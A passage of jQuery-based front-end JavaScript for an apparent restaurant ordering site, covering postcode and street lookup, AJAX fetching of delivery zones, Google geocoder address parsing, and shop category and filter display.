    $j('[data-locator-show-on-collection-warning]').toggle(show_postcode_warning && method == 'collection')
    $j('[data-locator-show-on-street-warning]').toggle(show_street_warning)

    $j('[data-locator-postcode-input]').attr('data-locator-error', function () {
      return show_postcode_warning ? '' : null
    })
    $j('[data-locator-street-input]').attr('data-locator-error', function () {
      return show_street_warning ? '' : null
    })

    // Restaurants
    $j('[data-locator-restaurant]').hide()
    if (shop_ids) {
      $j.each(shop_ids, function () {
        $j('[data-locator-restaurant=' + this + ']').show()
      })
    }

    // Set element values / attributes
    $j('[data-locator-selected-method]').attr('data-locator-selected-method', method)

    $j('[data-locator-postcode-input]').val(postcode)
    $j('[data-locator-postcode]').html(postcode)

    $j('[data-locator-street-input]').val(street)
    $j('[data-locator-street]').html(street)
  }

  var toggleFold = function (shop_id) {
    if ($j('[data-locator-restaurant=' + shop_id + '].locator-restaurant_open').size() > 0) {
      $j('[data-locator-restaurant=' + shop_id + ']').removeClass('locator-restaurant_open')
    } else {
      $j('.locator-restaurant_open').removeClass('locator-restaurant_open')
      $j('[data-locator-restaurant=' + shop_id + ']').addClass('locator-restaurant_open')
    }
  }

  return {
    // ------------------------
    // Initialization
    // ------------------------
    setRestaurantUrls: function (_shop_urls) {
      shop_urls = _shop_urls
    },

    setDeliveryPostalCodes: function (_delivery_postal_codes) {
      delivery_postal_codes = _delivery_postal_codes
    },

    setCollectionPostalCodes: function (_collection_postal_codes) {
      collection_postal_codes = _collection_postal_codes
    },

    init: function (_options) {
      if (!checkInit()) return

      // Save options
      country = _options.country
      if (!country) return console.error('Locator.init: missing country')

      if (_options.default_redirect_to_page) default_redirect_to_page = _options.default_redirect_to_page
      if (_options.default_method) default_method = _options.default_method
      delivery_autoredirect = !!_options.delivery_autoredirect
      postcode_in_collection = _options.postcode_in_collection == undefined ? allShopIds().length >= 2 : _options.postcode_in_collection
      use_streets = !!_options.use_streets
      use_autocomplete = _options.use_autocomplete == undefined ? true : _options.use_autocomplete
      displayed_postal_code = _options.displayed_postal_code == undefined ? displayed_postal_code : _options.displayed_postal_code

      // Set handlers
      initHandlers()

      // Reset shop picker state
      Locator.resetMethod()
    },

    // ------------------------
    // Other public methods
    // ------------------------
    goToRestaurant: function (element) {
      var shop_id = $j(element).closest('[data-locator-restaurant]').attr('data-locator-restaurant')
      redirectToShop(shop_id)
    },

    resetMethod: function () {
      $j('[data-locator-method=' + default_method + ']').prop('checked', true)
      methodSelected()
    },

    resetPostcode: function () {
      $j('[data-locator-postcode-input]').val('')
      postcodeSelected()
    },

    resetStreet: function () {
      $j('[data-locator-street-input]').val('')
      streetSelected()
    },

    submitPostcode: function () {
      if (redirected) return
      postcodeSelected()
    },

    submitStreet: function () {
      if (redirected) return
      streetSelected()
    },

    toggleFold: toggleFold
  }
}())
/*****************************
 Api Locator
 *****************************/

var ApiLocator = (function () {
  // --------------
  // Variables
  // --------------
  // 'delivery', 'collection' or 'eat_in'
  var method

  // The entered postcode
  var postcode

  // The entered street
  var street

  // The shop ids matching the entered postcode/street.
  var shop_ids

  // The streets of the selected postcode
  // street name -> [shop_ids]
  var postcode_streets

  // Show postcode/street warning?
  var show_postcode_warning = false
  var show_street_warning = false

  // Are we currently being redirected?
  var redirected = false

  // --------------
  // Settings
  // --------------
  // The default page the user is redirected on
  var default_redirect_to_page = '/categories'

  // Used for postcode normalization
  var country

  // Default method (delivery/collection)
  var default_method = 'delivery'

  // In delivery mode, automatically redirect the user to the shop when a valid postcode was entered and it
  // matches exactly one one restaurant.
  var delivery_autoredirect

  // Show the postcode field in collection?
  var postcode_in_collection

  // Does the user have to enter the street name?
  var use_streets

  // shop id -> URL
  var shop_urls

  // postal code and city -> { ajax_street_url: URL, shop_ids: [shop_ids] } (postal code/city of the delivery zones)
  var delivery_postal_codes

  // postal code and city -> [shop_ids] (postal code/city of the shops)
  var collection_postal_codes

  // Show the postcode and streets autocomplete popup
  var use_autocomplete

  var minimum_input_char_length = 3

  // Used to avoid abuse of the api
  var last_fetch_api_time

  // Display method for the select options
  var displayed_postal_code = function (postal_code, city) {
    return postal_code + ' - ' + city
  }

  // --------------
  // Initialization
  // --------------
  var checkInit = function () {
    // disabled as we load data from API
    // if (shop_urls == undefined) {
    //   console.error('Locator.setRestaurantUrls must be called before init')
    //   return false
    // }
    // if (delivery_postal_codes == undefined) {
    //   console.error('ApiLocator.setDeliveryPostalCodes must be called before init')
    //   return false
    // }
    // if (collection_postal_codes == undefined) {
    //   console.error('ApiLocator.setCollectionPostalCodes must be called before init')
    //   return false
    // }
    return true
  }

  var initHandlers = function () {
    console.log('initHandlers')

    $j('[data-locator-method]').click(function () {
      methodSelected()
    })

    $j('[data-locator-postcode-input],[data-locator-street-input]').on('keypress focus', function () {
      $j(this).removeAttr('data-locator-error')
    })

    $j('[data-locator-postcode-input]').keypress(function (e) {
      if (e.keyCode == 13) {
        e.preventDefault()
        forcePostcodeSelected()
        if (use_autocomplete) $j(this).autocomplete('close')
      }
    })

    $j('[data-locator-street-input]').keypress(function (e) {
      if (e.keyCode == 13) {
        e.preventDefault()
        forcePostcodeSelected()
        if (use_autocomplete) $j(this).autocomplete('close')
      }
    })

    // track input and start initalization of autocomplete once 3 char are entered
    $j('[data-locator-postcode-input]').on('input change paste', async function (e) {
      let input_postal_code = $j('[data-locator-postcode-input]').val()
      console.log('input_postal_code', input_postal_code)

      if (inspectPostcode(input_postal_code).validate) {
        console.log('inspect postcode validate')

        ApiLocator.fetchDataFromApi(input_postal_code);
        await new Promise(r => setTimeout(r, 200));
        forcePostcodeSelected()
      }

      if (input_postal_code.length >= 3) {
        console.log('input_postal_code.length < 3')

        ApiLocator.fetchDataFromApi(input_postal_code);
      }
    })
  }

  function inspectPostcode(postcode) {
    postcode = postcode.replace(/\s+/g, '').toUpperCase(); // remove any spaces and convert to uppercase

    const ukGovRegex = /^([Gg][Ii][Rr] 0[Aa]{2})|((([A-Za-z][0-9]{1,2})|(([A-Za-z][A-Ha-hJ-Yj-y][0-9]{1,2})|(([A-Za-z][0-9][A-Za-z])|([A-Za-z][A-Ha-hJ-Yj-y][0-9][A-Za-z]?))))\s?[0-9][A-Za-z]{2})$/;

    // set default output results (assuming invalid postcode)
    const output = {
      validate: false,
      prefix: '',
      suffix: '',
      sector: '',
      postcode: ''
    };

    const match = ukGovRegex.exec(postcode);

    if (match) {
      output.validate = true;
      const suffix = postcode.substr(-3);
      const prefix = postcode.replace(suffix, '');
      const sector = prefix + ' ' + suffix[0];
      output.prefix = prefix;
      output.suffix = suffix;
      output.sector = sector;
      output.postcode = prefix + ' ' + suffix;
    } else {
      // If the full postcode is invalid but the sector part is valid
      const sectorRegex = /^(([A-Za-z][0-9]{1,2})|(([A-Za-z][A-Ha-hJ-Yj-y][0-9]{1,2})|(([A-Za-z][0-9][A-Za-z])|([A-Za-z][A-Ha-hJ-Yj-y][0-9][A-Za-z]?))))$/;
      const sectorMatch = sectorRegex.exec(postcode);
      if (sectorMatch) {
        output.sector = sectorMatch[0];
        output.sector = output.sector.substring(0, output.sector.length - 1) + ' ' + output.sector.substring(output.sector.length - 1, output.sector.length);
      }
    }

    return output;
  }

  // --------------
  // Helpers
  // --------------
  var sectorFromKey = function (key) {
    return key.split('$$$')[0]
  }

  var cityFromKey = function (key) {
    return key.split('$$$')[1]
  }

  function allShopIds () {
    var all_shop_ids = []
    $j.each(collection_postal_codes, function (postal_code, postal_code_map) {
      var _shop_ids = postal_code_map['shop_ids']
      $j.each(_shop_ids, function (i, _shop_id) {
        if (all_shop_ids.indexOf(_shop_id) == -1) all_shop_ids.push(_shop_id)
      })
    })
    return all_shop_ids
  }

  var postcodeAutocomplete = function () {
    // TODO run this after 3 char ?
    $j('[data-locator-postcode-input]').autocomplete({
      source: $j.map(
          method == 'delivery' ? delivery_postal_codes : collection_postal_codes,
          function (value, key) {
            return displayed_postal_code(sectorFromKey(key), cityFromKey(key))
          }
      ),
      response: function(event, ui) {
        // if (ui.content.length === 0) {
        // }
      },
      select: function (event, ui) {
        $j(this).val(ui.item.value)
        postcodeSelected()
      }
    })
  }

  var streetAutocomplete = function () {
    $j('[data-locator-street-input]').autocomplete({
      source: $j.map(
          postcode_streets,
          function (value, key) {
            return key
          }
      ),
      select: function (event, ui) {
        $j(this).val(ui.item.value)
        streetSelected()
      }
    })
  }

  var redirectToShop = function (shop_id) {
    var redirect_to_page = Util.getParameterFromUrl(window.location.href, 'redirect_to_page') || default_redirect_to_page
    var url = shop_urls[shop_id] + redirect_to_page,
        url_with_method = Util.addKeyValueToURL(url, 'delivery_method', method)

    Util.redirect(url_with_method)

    redirected = true // Prevent refreshDisplay to hide/show new items while we are being redirected
  }

  var deliveryAutoredirect = function () {
    if (delivery_autoredirect && method == 'delivery' && shop_ids && shop_ids.length == 1) {
      redirectToShop(shop_ids[0])
    }
  }

  // --------------
  // Events
  // --------------
  var methodSelected = function () {
    setMethodFromInput()
    if (use_autocomplete) postcodeAutocomplete()

    ApiLocator.resetPostcode()
  }

  var forcePostcodeSelected = function () {
    let postcode = $j('[data-locator-postcode-input]').val()
    let postcodeAttr = inspectPostcode(postcode)

    if (!postcodeAttr.validate && !postcodeAttr.sector) {
      if (method == 'delivery') $j('[data-locator-show-on-delivery-warning]').show()
      if (method == 'collection') $j('[data-locator-show-on-collection-warning]').show()
      return false
    }

    postcode = postcodeAttr.postcode

    let postal_codes = method == 'delivery' ? delivery_postal_codes : collection_postal_codes
    let key = findMatchingKey(postal_codes, postcode)

    if (!key) {
      console.log('postcode not found, trying to find sector', postcode)
      let sector = postcodeAttr.sector
      key = findMatchingKey(postal_codes, sector)
    }

    if (!key) {
      console.log('postcode not found, error', postcodeAttr.sector)
      if (method == 'delivery') $j('[data-locator-show-on-delivery-warning]').show()
      if (method == 'collection') $j('[data-locator-show-on-collection-warning]').show()
      return false
    }

    let value_item = displayed_postal_code(sectorFromKey(key), cityFromKey(key));

    $j('[data-locator-postcode-input]').val(value_item)

    setPostcodeFromInput()
    if (use_autocomplete) streetAutocomplete()

    ApiLocator.resetStreet()

    return true
  }

  function findMatchingKey(postal_codes, inputString) {
    for (let key in postal_codes) {
      let keyPrefix = key.split('$$$')[0];
      if (keyPrefix === inputString) {
        return key;
      }
    }
    return null;
  }

  var postcodeSelected = function () {
    setPostcodeFromInput()
    if (use_autocomplete) streetAutocomplete()

    ApiLocator.resetStreet()
  }

  var streetSelected = function () {
    setStreetFromInput()
    refreshDisplay()
  }

  var setMethodFromInput = function () {
    method = $j('input[data-locator-method]:checked').attr('data-locator-method') || default_method
  }

  var setPostcodeFromInput = function () {
    postcode = undefined
    postcode_streets = undefined
    shop_ids = undefined
    show_postcode_warning = false

    if (!(method == 'delivery' || postcode_in_collection)) {
      shop_ids = allShopIds()
      return
    }

    var _postcode = $j('[data-locator-postcode-input]').val() || Util.getParameterFromUrl(window.location.href, 'postcode')
    if (!_postcode) {
      return
    }

    var postal_codes = (method == 'delivery' ? delivery_postal_codes : collection_postal_codes),
        sector = Postcode.sector(country, _postcode),
        selected_keys = $j.grep(Object.keys(postal_codes), function (key, i) {
          var currentSector = sectorFromKey(key)
          var currentCity = cityFromKey(key)

          if (displayed_postal_code(currentSector, currentCity) == _postcode)
            return true;
          else
            return currentSector == sector;
        })

    if (!selected_keys) {
      show_postcode_warning = true
      return
    }

    postcode = Postcode.normalize(country, _postcode)

    if (use_streets && !Array.isArray(selected_keys) && postal_codes[selected_keys]['ajax_street_url']) {
      $j.ajax({
        url: postal_codes[selected_keys]['ajax_street_url'],
        async: false,
        dataType: 'json',
        success: function (data) {
          postcode_streets = data
        }
      })
    } else {
      if (Array.isArray(selected_keys)) {
        shop_ids = []
        selected_keys.forEach((key) => {
          shop_ids = shop_ids.concat(postal_codes[key]['shop_ids'])
        })
      } else {
        shop_ids = postal_codes[selected_keys]['shop_ids']
      }
    }

    deliveryAutoredirect()
  }

  var setStreetFromInput = function () {
    street = undefined
    show_street_warning = false

    if (!postcode_streets) {
      return
    }

    shop_ids = undefined

    var _street = $j('[data-locator-street-input]').val()
    if (!_street) {
      return
    }

    shop_ids = postcode_streets[_street]
    if (!shop_ids) {
      show_street_warning = true
      return
    }

    deliveryAutoredirect()

    street = _street
  }

  // --------------
  // Display
  // --------------
  var refreshDisplay = function () {
    if (redirected) return

    // Toggle elements
    var show_postcode_form = !postcode && !shop_ids
    $j('[data-locator-postcode-form]').toggle(show_postcode_form)
    if (show_postcode_form) $j('[data-locator-postcode-input]').focus()

    var show_street_form = !!postcode_streets && !shop_ids
    $j('[data-locator-street-form]').toggle(show_street_form)
    if (show_street_form) $j('[data-locator-street-input]').focus()

    $j('[data-locator-show-on-postcode]').toggle(!!postcode)
    $j('[data-locator-show-on-street]').toggle(!!street)
    $j('[data-locator-show-on-selected]').toggle(!!shop_ids)

    $j('[data-locator-show-on-delivery]').toggle(method == 'delivery')
    $j('[data-locator-hide-on-delivery]').toggle(method != 'delivery')
    $j('[data-locator-show-on-collection]').toggle(method == 'collection')
    $j('[data-locator-hide-on-collection]').toggle(method != 'collection')

    $j('[data-locator-show-on-delivery-warning]').toggle(show_postcode_warning && method == 'delivery')
    $j('[data-locator-show-on-collection-warning]').toggle(show_postcode_warning && method == 'collection')
    $j('[data-locator-show-on-street-warning]').toggle(show_street_warning)

    $j('[data-locator-postcode-input]').attr('data-locator-error', function () {
      return show_postcode_warning ? '' : null
    })
    $j('[data-locator-street-input]').attr('data-locator-error', function () {
      return show_street_warning ? '' : null
    })

    // Restaurants
    $j('[data-locator-restaurant]').hide()
    if (shop_ids) {
      $j.each(shop_ids, function () {
        $j('[data-locator-restaurant=' + this + ']').show()
      })
    }

    // Set element values / attributes
    $j('[data-locator-selected-method]').attr('data-locator-selected-method', method)

    $j('[data-locator-postcode-input]').val(postcode)
    $j('[data-locator-postcode]').html(postcode)

    $j('[data-locator-street-input]').val(street)
    $j('[data-locator-street]').html(street)
  }

  var toggleFold = function (shop_id) {
    if ($j('[data-locator-restaurant=' + shop_id + '].locator-restaurant_open').size() > 0) {
      $j('[data-locator-restaurant=' + shop_id + ']').removeClass('locator-restaurant_open')
    } else {
      $j('.locator-restaurant_open').removeClass('locator-restaurant_open')
      $j('[data-locator-restaurant=' + shop_id + ']').addClass('locator-restaurant_open')
    }
  }

  return {
    // ------------------------
    // Initialization
    // ------------------------
    fetchRestaurantUrls: function () {
      $j.ajax({
        url: '/api/get_restaurant_urls',
        type: 'GET',
        data: {
        },
        success: function(response) {
          shop_urls = response["restaurant_urls"];
        },
        error: function(error) {
          console.error('Error fetching postal codes:', error);
        }
      });
    },

    fetchDataFromApi: function (input_postal_code) {
      console.log('fetching data from api');

      // limit api calls
      if (last_fetch_api_time && (new Date().getTime() - last_fetch_api_time) < 50) {
        console.log('abuse prevent');
        return;
      }
      last_fetch_api_time = new Date().getTime();

      $j.ajax({
        url: '/api/get_postal_codes?input_postal_code=' + input_postal_code,
        type: 'GET',
        success: function(response) {
          delivery_postal_codes = response["delivery_postal_codes"];
          collection_postal_codes = response["collection_postal_codes"];
          console.log('fetcheddata from api');
          console.log('delivery_postal_codes', delivery_postal_codes);
          console.log('collection_postal_codes', collection_postal_codes);
          postcodeAutocomplete()
        },
        error: function(error) {
          console.error('Error fetching postal codes:', error);
        }
      });
    },


    init: function (_options) {

      console.log('init');
      if (!checkInit()) return

      // Save options
      country = _options.country
      if (!country) return console.error('ApiLocator.init: missing country')

      if (_options.default_redirect_to_page) default_redirect_to_page = _options.default_redirect_to_page
      if (_options.default_method) default_method = _options.default_method

      if (_options.minimum_input_char_length) minimum_input_char_length = _options.minimum_input_char_length

      delivery_autoredirect = !!_options.delivery_autoredirect
      postcode_in_collection = _options.postcode_in_collection == undefined ? allShopIds().length >= 2 : _options.postcode_in_collection
      use_streets = !!_options.use_streets
      use_autocomplete = _options.use_autocomplete == undefined ? true : _options.use_autocomplete
      displayed_postal_code = _options.displayed_postal_code == undefined ? displayed_postal_code : _options.displayed_postal_code

      // Set handlers
      initHandlers()

      ApiLocator.fetchRestaurantUrls()

      // Reset shop picker state
      ApiLocator.resetMethod()
    },

    // ------------------------
    // Other public methods
    // ------------------------
    goToRestaurant: function (element) {
      var shop_id = $j(element).closest('[data-locator-restaurant]').attr('data-locator-restaurant')
      redirectToShop(shop_id)
    },

    resetMethod: function () {
      $j('[data-locator-method=' + default_method + ']').prop('checked', true)
      methodSelected()
    },

    resetPostcode: function () {
      $j('[data-locator-postcode-input]').val('')
      postcodeSelected()
    },

    resetStreet: function () {
      $j('[data-locator-street-input]').val('')
      streetSelected()
    },

    submitPostcode: function () {
      if (redirected) return
      postcodeSelected()
    },

    submitStreet: function () {
      if (redirected) return
      streetSelected()
    },

    toggleFold: toggleFold
  }
}())
/*****************************
 LoyaltyPage
 *****************************/

var LoyaltyPage = (function () {
  var init = function () {
    Util.showMore($j('[data-loyalty-show-more]'), $j('[data-loyalty-row]'), 5)
  }

  return {
    init: init
  }
}())
/*****************************
 LpAddress

 Class encapsulating an address, as represented in rs_buyer_address
 *****************************/

var LpAddress = function (address1, address2, postal_code, city, country, latitude, longitude) {
  this.address1 = address1
  this.address2 = address2
  this.postal_code = postal_code
  this.city = city
  this.country = country
  this.latitude = latitude
  this.longitude = longitude

  function cityBeforePostalCode () {
    return ['GB', 'NL', 'US'].includes(this.country)
  }

  function postalCodeAndCity () {
    var elements = cityBeforePostalCode() ? [this.postal_code, this.city] : [this.city, this.postal_code]
    return elements.filter(function (obj) {return obj}).join(' ')
  }

  function toString () {
    return [
      this.address1,
      this.address2,
      this.postalCodeAndCity()
    ].filter(function (obj) {return obj}).join(', ')
  }

  function setLatLng (latLng) {
    this.latitude = latLng.lat()
    this.longitude = latLng.lng()
  }

  // ***************************
  // Public methods
  // ***************************
  this.postalCodeAndCity = postalCodeAndCity
  this.toString = toString
  this.setLatLng = setLatLng
}

LpAddress.createFromLatLng = async function (latLng) {
  var geocoder = new google.maps.Geocoder;

  var PLACE_FIELD_NAMES = {
    route: 'long_name',
    street_address: 'long_name',
    street_number: 'long_name',

    sublocality_level_1: 'long_name',
    sublocality_level_2: 'long_name',
    sublocality_level_3: 'long_name',
    sublocality_level_4: 'long_name',
    sublocality_level_5: 'long_name',
    neighborhood: 'long_name',

    postal_code: 'short_name',
    postal_code_prefix: 'short_name',

    postal_town: 'long_name',
    locality: 'long_name',

    premise: 'long_name',
    subpremise: 'long_name',

    country: 'short_name'
  };

  let latitude = latLng.lat()
  let longitude = latLng.lng()
  let address1 = ""
  let address2 = ""
  let postal_code = ""
  let city = ""
  let country = ""

  await geocoder.geocode({'location': latLng}, function(results, status) {
    if (status === 'OK') {
      if (results[0]) {
        var components = {};
        results[0].address_components.forEach(function (addressComponent) {
          addressComponent.types.forEach(function (type) {
            var fieldName = PLACE_FIELD_NAMES[type];
            if (fieldName) {
              if (!components[type]) {
                components[type] = addressComponent[fieldName]
              } else {
                components[type] += ', ' + addressComponent[fieldName]
              }
            }
          });
        });

        var addressBlocks = [
          [
            components.street_address ||
            [
              components.street_number,
              components.route
            ].filter(function (obj) {return obj}).join(' ')
          ].filter(function (obj) {return obj}).join(', '),

          [
            components.sublocality_level_1,
            components.sublocality_level_2,
            components.sublocality_level_3,
            components.sublocality_level_4,
            components.sublocality_level_5
          ].filter(function (obj) {return obj}).join(', '),

          [
            components.premise,
            components.subpremise
          ].filter(function (obj) {return obj}).join(', ')
        ].filter(function (obj) {return obj});

        address1 = addressBlocks[0]; // address_1
        address2 = [addressBlocks[1], addressBlocks[2]].filter(function (obj) {return obj}).join(', '); // address_2
        postal_code = components.postal_code || components.postal_code_prefix; // postal_code
        city = components.locality || components.postal_town; // city
        country = components.country; // country

        console.log("address found");
      } else {
        console.log('No results found');
      }
    } else {
      console.log('Geocoder failed due to: ' + status);
    }
  });

  return new LpAddress(
      address1,
      address2,
      postal_code,
      city,
      country,
      latitude,
      longitude
  )
}

// ************************
// Create an LpAddress from a Google Place
// ************************
LpAddress.createFromPlace = function (place) {
  var PLACE_FIELD_NAMES = {
    route: 'long_name',
    street_address: 'long_name',
    street_number: 'long_name',

    sublocality_level_1: 'long_name',
    sublocality_level_2: 'long_name',
    sublocality_level_3: 'long_name',
    sublocality_level_4: 'long_name',
    sublocality_level_5: 'long_name',
    neighborhood: 'long_name',

    postal_code: 'short_name',
    postal_code_prefix: 'short_name',

    postal_town: 'long_name',
    locality: 'long_name',

    premise: 'long_name',
    subpremise: 'long_name',

    country: 'short_name'
  }

  if (!place.address_components || place.address_components.length === 0) return

  var components = {}
  place.address_components.forEach(function (addressComponent) {
    addressComponent.types.forEach(function (type) {
      var fieldName = PLACE_FIELD_NAMES[type]
      if (fieldName) {
        if (!components[type]) {
          components[type] = addressComponent[fieldName]
        } else {
          components[type] += ', ' + addressComponent[fieldName]
        }
      }
    })
  })

  var addressBlocks = [
    [
      components.street_address ||
      [
        components.street_number,
        components.route
      ].filter(function (obj) {return obj}).join(' ')
    ].filter(function (obj) {return obj}).join(', '),

    [
      components.sublocality_level_1,
      components.sublocality_level_2,
      components.sublocality_level_3,
      components.sublocality_level_4,
      components.sublocality_level_5
    ].filter(function (obj) {return obj}).join(', '),

    [
      components.premise,
      components.subpremise
    ].filter(function (obj) {return obj}).join(', ')
  ].filter(function (obj) {return obj})

  return new LpAddress(
      addressBlocks[0], // address_1
      [addressBlocks[1], addressBlocks[2]].filter(function (obj) {return obj}).join(', '), // address_2
      components.postal_code || components.postal_code_prefix, // postal_code
      components.locality || components.postal_town, // city
      components.country, // country
      place.geometry.location.lat(), // latitude
      place.geometry.location.lng() // longitude
  )
}/*********************************************
  Marketplace filtering
 *********************************************/
/*
  This uses 2 filtering arrays:
  shops[] - collects shops IDs from seleted categories
  filters[] - collects filters data from selected filters
  On any category/filter update custom event is fired to update shops display.

  Supported filter types:
  number: checks for Max value of the parameter, filters[] includes 1 filter data only. 
          Example: Delivery costs
  exact_value: checks for exact value of the parameter, filters[] may include several filter data.
          Example: Price range, may be several values ON
  boolean: checks if parameter == selected value, filters[] includes 1 filter data only.
           Example: Offers discount - true/false

  This supports several separated categories filters (e.g. desktop and mobile) and its sinchronization when one is updated
*/

var marketplaceFiltering = ( function () {
  var filters
  var shops
  var shopsList
  var shopsArray
  var selectedFilterType
  var selectedFilterValue
  var updateDisplayEvent
  var noShopMessage


  // get parent by attribute name
  // replace for $j(elem).parents(attributeName)

  var getParent = function (elem,selector) {
    if (elem.tagName == "BODY") return null
    if (elem.hasAttribute(selector)) return elem
    return getParent(elem.parentElement,selector)
  }


  /************************
    Filters
  ************************/

  // update filters[] if any filter changed

  var updateActiveFilters = function (id,type,name,value) {
    var filter = {
      id: id,
      type: type,
      name: name,
      value: value
    }

    for (var i=0; i < filters.length; i++) {

      if ( filters[i].id != id ) continue

      switch (type) {
        case "exact_value":
          if ( filters[i].type == type &&
               filters[i].name == name &&
               filters[i].value == value ) { 
            return 
          }
          break
        default:
          filters[i] = filter
          return
      }
    }

    filters.push(filter)
  }

  // remove active filter
  var removeActiveFilter = function (id,type,name,value) {

    for (var i=0; i < filters.length; i++) {

      if ( filters[i].id != id ) continue

      switch (type) {
        case "exact_value":
          if ( filters[i].type == type &&
               filters[i].name == name &&
               filters[i].value == value ) { 
            filters.splice(i,1)
            return
          }
          break
        default:
          filters.splice(i,1)
          return
      }
    }
  }

  // get updated filter attributes

  var getFilterAttributes = function (elem) {
    var parent = getParent(elem,"data-mkp-filter")
    if (!parent) return false

    var filterID = parent.getAttribute("data-mkp-filter")
    var filterType = elem.getAttribute("data-filter-type")
    var filterName = elem.getAttribute("data-filter-name")

    return {
      parent: parent,
      id: filterID,
      type: filterType,
      name: filterName
    }
  }

  // filter type == number
  var filterMinValue = function (elem) {
    var filter = getFilterAttributes(elem)
    if (!filter) return

    var selectedElems = filter.parent.querySelectorAll("[data-filter-type='number']:checked")

    if (selectedElems.length > 0) {
      var minVal
      for (var i = 0; i < selectedElems.length; i++) {
        var value = selectedElems[i].value * 1    // getting string -> number
        if (i==0) {
          minVal = value
          continue
        }
        minVal = minVal > value ? value : minVal
      }
 
      updateActiveFilters(filter.id,filter.type,filter.name,minVal)

    } else {
      removeActiveFilter(filter.id,0,0,0) // we need just ID
    }

    // update shops display
    document.dispatchEvent(updateDisplayEvent)
  }

  // filter type == exact_value
  var filterExactValue = function (elem) {
    var filterValue = elem.value * 1

    var filter = getFilterAttributes(elem)
    if (!filter) return

    if (elem.checked) {
      updateActiveFilters(filter.id,filter.type,filter.name,filterValue)
    } else {
      removeActiveFilter(filter.id,filter.type,filter.name,filterValue)
    }

    // update shops display
    document.dispatchEvent(updateDisplayEvent)
  }

  // filter type == boolean
  var filterBoolean = function (elem) {
    var filterValue = elem.value

    var filter = getFilterAttributes(elem)
    if (!filter) return

    if (elem.checked) {
      updateActiveFilters(filter.id,filter.type,filter.name,filterValue)
    } else {
      removeActiveFilter(filter.id,filter.type,filter.name,filterValue)
    }

    // update shops display
    document.dispatchEvent(updateDisplayEvent)
  }

  // sorting out filter's update event
  var updateFilter = function (event) {
    var elem = event.target
    var type = elem.getAttribute("data-filter-type")

    switch(type) {
      case "number":
        filterMinValue(elem)
        break
      case "exact_value":
        filterExactValue(elem)
        break
      case "boolean":
        filterBoolean(elem)
        break
    }
  }


  /************************
    Categories 
  ************************/

  // updates visible shops array by selected categories
  // uses parent categories container (may be several) which element was clicked
  // shop ID is converting to integer value for compatibility

  var updateShopsArray = function (catsParent) {
    var cats = catsParent.querySelectorAll(".selected")
    shops = []

    for (var i = 0; i < cats.length; i++) {
      var shopsAttr = cats[i].getAttribute("data-category-shop")
      var shopsArray = shopsAttr.replace(/[\s\[\]]/g,'').split(',')

      for (var j = 0; j < shopsArray.length; j++) {
        var elem = parseInt(shopsArray[j])
        if ( !shops.includes(elem) ) {
          shops.push(elem)
        }
      }
    }

    // update shops display
    document.dispatchEvent(updateDisplayEvent)
  }

  // updates active categories class "selected" when category is clicked
  // and initiates shops array update passing current categories container as catsParent

  var updateCategories = function (event) {
    var catItem = event.currentTarget

    var defaultCat = catItem.getAttribute("data-category-default") == "true" ? true : false
    var selected = catItem.classList.contains("selected")

    var catsParent = getParent(catItem,"data-mkp-categories")
    if(catsParent == null) return

    var catItemDefault = catsParent.querySelectorAll("[data-category-default='true']")[0]

    var updated = false

    if (defaultCat && !selected) {
      var selectedItems = catsParent.querySelectorAll(".selected")

      if (selectedItems.length > 0) {
        for (let i=0; i < selectedItems.length; i++) {
          selectedItems[i].classList.remove("selected")
        }
      }

      catItem.classList.add("selected")
      updated = true
    
    } else if (!defaultCat) {

      catItem.classList.toggle("selected")

      if (catItem.classList.contains("selected")) {
        if (catItemDefault.classList.contains("selected")) {
          catItemDefault.classList.remove("selected")
        }
      } else {
        if ( catsParent.querySelectorAll(".selected").length == 0 ) {
          catItemDefault.classList.add("selected")
        }
      }

      updated = true
    }

    if (updated) {
      updateShopsArray(catsParent)

      // sinchronize other category filter(s) if any
      catsFiltersSinchronize(catsParent)
    }
  }


  /************************
    Display shops
  ************************/

  // checks if current shop's data fits selected filters
  // return true/false

  var checkFilter = function (shopInfo) {
    var name
    var priceRange = false
    var priceRangeApplied = false

    if (filters.length == 0) return true

    for (let i=0; i < filters.length; i++ ) {

      name = filters[i].name.includes('price_range') ? "price_range" : filters[i].name

      if (!shopInfo.hasAttribute(name)) return false

      var t = shopInfo.getAttribute(name)

      switch(filters[i].type) {
        case "number":
          if (t > filters[i].value) return false
          break

        case "exact_value":
          // we may have several values of the same name & type
          if (name=="price_range") {
            priceRange = priceRange || (t == filters[i].value)
            priceRangeApplied = true
          } 
          break

        case "boolean":
          if (t != filters[i].value) return false
          break
      }
    }

    if (priceRangeApplied && !priceRange) return false

    return true
  }

  var showNoShopMessage = function () {
    noShopMessage.hidden = false
  }

  var hideNoShopMessage = function () {
    noShopMessage.hidden = true
  }

  var hideShop = function (shop) {
    shop.hidden = true
  }

  var showShop = function (shop) {
    shop.hidden = false
  }

  // display shops according to selected categories and filters

  var displayShops = function () {
    var shopsCounter = 0

    hideNoShopMessage()   // just in case

    for (let i=0; i < shopsList.length; i++) {
      var shopID = parseInt(shopsList[i].getAttribute("data-google-locator-restaurant"))
      var shopInfo = shopsList[i].querySelector("[data-mkp-shop-info]")

      // if in categories
      if (!shops.includes(shopID)) {
        hideShop(shopsList[i])
        continue
      }

      // if in filters
      if (checkFilter(shopInfo)) {
        showShop(shopsList[i])
        //shopsCounter++
        // if not hidden by Google locator
        if (!shopsList[i].hasAttribute("data-google-locator-restaurant-hidden")) shopsCounter++
      } else {
        hideShop(shopsList[i])
      }
    }

    if (shopsCounter == 0) {
      showNoShopMessage()
    }
  }
  

  /************************
    Categories filters 
    sinchronization
  ************************/

  var catsFiltersSinchronize = function (updatedCatParent) {

    var updatedCatParentID = updatedCatParent.getAttribute("data-mkp-categories")
    if (!updatedCatParentID) return;
  
    // collects selected categories index
    var currentCategories = updatedCatParent.querySelectorAll("[data-category-shop]")
    var selectedArray = []
    
    for (let i=0; i < currentCategories.length; i++) {
      if (currentCategories[i].classList.contains("selected")) selectedArray.push(i)
    }

    // sinchro other cats filters if any
    var otherCatsFilters = document.querySelectorAll(":not([data-mkp-categories='"+ updatedCatParentID + "'])")
    if (otherCatsFilters.length == 0) return

    for (let i=0; i < otherCatsFilters.length; i++) {
      let items =  otherCatsFilters[i].querySelectorAll("[data-category-shop]")
      for (let j=0; j< items.length; j++) {
        if (selectedArray.includes(j)) {
          if (!items[j].classList.contains("selected")) items[j].classList.add("selected")
        } else {
          if (items[j].classList.contains("selected")) items[j].classList.remove("selected")
        }
      }
    }

  }


  /************************
    Sorting shops list
  ************************/

  var compareShops = function (a,b) {
    var a_value
    var b_value
    var a_info = a.querySelector("[data-mkp-shop-info]")
